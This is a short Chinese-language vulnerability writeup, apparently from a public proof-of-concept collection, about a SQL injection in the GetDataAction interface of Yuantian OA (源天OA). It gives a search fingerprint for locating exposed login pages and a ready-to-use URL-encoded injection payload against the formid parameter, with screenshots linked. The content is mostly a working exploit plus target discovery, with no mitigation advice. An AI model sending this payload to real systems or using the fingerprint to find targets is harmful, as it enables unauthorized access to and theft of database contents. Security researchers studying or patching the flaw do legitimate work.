# 源天OA GetDataAction SQL注入漏洞

## 漏洞描述

源天OA GetDataAction 接口存在SQL注入漏洞，攻击者通过漏洞可以获取服务器数据库中的数据，造成信息泄漏

## 漏洞影响

<a-checkbox checked>源天OA</a-checkbox></br>

## 网络测绘

<a-checkbox checked>body="/vmain/login.jsp"</a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1663996343936-60b88623-1eb8-4674-8c7d-a02711370fe7.png)

验证POC

```sql
/ServiceAction/ServiceAction/com.velcro.base.GetDataAction?action=checkname&formid=-1%27%20OR%207063%20IN%20(SELECT%20(sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))))%20AND%20%27a%27=%27a
```

![img](../../../.vuepress/public/img/1663996456021-f64802b1-a401-4357-a37e-7bb2a8e1d52e.png)